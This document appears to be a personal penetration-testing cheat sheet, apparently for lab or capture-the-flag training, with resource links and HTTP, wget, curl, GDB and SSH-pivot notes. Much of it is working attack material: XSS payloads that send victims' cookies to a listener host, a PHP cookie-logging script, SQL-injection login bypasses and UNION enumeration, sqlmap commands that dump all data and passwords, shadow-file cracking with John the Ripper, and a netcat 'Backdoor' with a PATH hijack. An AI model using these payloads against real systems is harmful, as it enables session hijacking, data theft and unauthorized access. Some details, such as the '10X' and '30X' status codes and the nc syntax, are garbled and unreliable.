/////////////Resources\\\\\\\\\\\\\

https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html
-or-
https://wiremask.eu/tools/buffer-overflow-pattern-generator/
ubuntu metasploit install --> compluting for geeks
socks proxy rfc
wayback machine
sqlbolt.com
https://owasp.org/www-community/xss-filter-evasion-cheatsheet
http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
shell-storm.org
https://en.wikibooks.org/wiki/OpenSSH/Cookbook/Tunnels

/////////HTTP reponse codes////////
10X == Informational
2XX == Success
30X == Redirection
4XX == Client Error
5XX == Server Error

/////////HTTP fields/////////
User-Agent
Referer
Cookie
Date
Server
Set-Cookie

/////////WGET/////////
wget -r -l2 -P /tmp ftp://<IP>/
wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' http://website
wget --load-cookies cookies.txt -p http://....com/interesting/article.php
wget --mirror <ip>	#recursively copies all webpages it finds, not stopped by robots.txt
	egrep -r '\b[[:alnum:]]{20}\b'	#cd into the dir wget creates, this looks for hashed flags
	egrep -ir '\bf..g\b' 		#cd into the dir wget creates, this looks for mutated "flag"

/////////proxychains with firefox/////////
addons--> foxyproxy--> (icon in right corner) settings--> add--> (type)socks5--> (proxy ip) localhost --> (port) 9050

/////////CURL/////////
curl -o stuff.html http://website/stuff.html
curl 'www..com' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png

----------------------------------
/////////Stored XSS/////////
<img src="http://10.50.XX.XX" onerror="window.open(&quot;http://10.50.CC.CC:8000/ram.png&quot;,&quot;xss&quot;,'height=500,width=500');">

/////////js cookie stealer to send to nc listener/////////
<script>document.location="http://x.x.x.x:8000? username="+document.cookie;</script>

/////////js posted to the stored xss vulnerable site/////////
<script>document.location="http://10.50.20.170/uploads/cookiestealer.php?username="+document.cookie;</script>

/////////php script on a webserver that will accept and store the stolen cookie. Must create cookiefile.txt first/////////
<?php
$cookie = $_GET["username"];
$steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+");
fwrite($steal,$cookie . "\n");
fclose($steal);
?>
-----------------------------------

///////// ReverseEngineering Notes \\\\\\\\\\\

objdump -d -M intel <filename>	
md5sum *
strings <on-file>
ltrace ./<linux exe>
strace ./<linux exe>	#more info than you might want

///// GDB \\\\\

gdb
file <filename>
show disa
show disassembly-flavor
disass main -or- loop
break *main
run
ni	#next instruction

/////////// SQL Injection \\\\\\\\\\\\\\\\

insert into members(firstname, lastname, username, password, email, permissions) values('bob', 'jones', 'Hacker', 'qwer@gmail.com', 1);#

) ' " -- #

SELECT id, name, description, (SELECT MAX(price) FROM products WHERE price <= 50 AND categories.id = category) AS maxamount FROM categories

SELECT id, name, description, (SELECT MAX(price) FROM products WHERE price <= 50 ) FROM categories 

use logins; SELECT username,password FROM users
	1		3	3	    2

#Post method (put this in username and password field)
admin' OR 1='1

#Get method (put this in the url)
?username=comrade' OR 1='1&passwd=comrade' OR 1='1

information_schema	#is a default database

#Union Seletion:
admin' UNION SELECT 1,2,3,4,5 from Information_Schema.Tables;#

#Show all Tables
admin' UNION SELECT TABLE_NAME,2,3,4,5 from Information_Schema.Tables;#

#Show all Columns
admin' UNION SELECT COLUMN_NAME,2,3,4,5 from Information_Schema.Columns;#

#Show all datatbases
admin' UNION SELECT SCHEMA_NAME,2,3,4,5 from Information_Schema.Schemata;#

admin' UNION SELECT table_schema,2,table_name,column_name,5 FROM Information_Schema.Columns;#
admin' UNION SELECT name,2,3,4,5 from session.user;#

==================================================================================================
python -m SimpleHTTPServer		#python simple http server

//John the Ripper
john --wordlist=passwordlist --rules --shells=sh,csh,tcsh,bash shadow #only crack accounts with shells
john --wordlist=passwordlist --rules --users=0 shadow #only crack root accounts

#if the question mentions a beacon
tcpdump -i any -c 50 -q -t -X src not 192.168.28.100 and dst not 192.168.28.100 and port not 53

//Backdoor
mknod /tmp/f p
cat /tmp/f | /bin/bash -i 2>&1 | nc -lp 127.0.0.1 8888 > /tmp/f
export PATH=/tmp:$PATH

//SQLI w/ sqlmap
proxychains sqlmap -u http://10.50.21.166/login.html --forms --threads=10 --level=5 --risk=2 --dbms=mysql --batch --dbs --schema --tables --columns -b --users --passwords --exclude-sysdbs --dump-all -v 0
proxychains sqlmap -u http://10.100.28.48/cases/productsCategory.php?category=1 --threads=10 --level=5 --risk=2 --dump-all --exclude-sysdbs --skip-static --hostname -v 0

//SSH
ssh -D 127.0.0.1:9050 user@ip -CNTX #dynamic pivot for proxychains
ssh-keygen -t rsa 							#creates ~/.ssh id_rsa id_rsa.pub
ssh-copy-id -i ~/.ssh/id_rsa.pub user@host 				#adds id_rsa.pub to remote user ~/.ssh/authorized_keys
ssh -J user@pivot:port user@internalhost:port 				#tunnel straight to internal hosts thru pivot
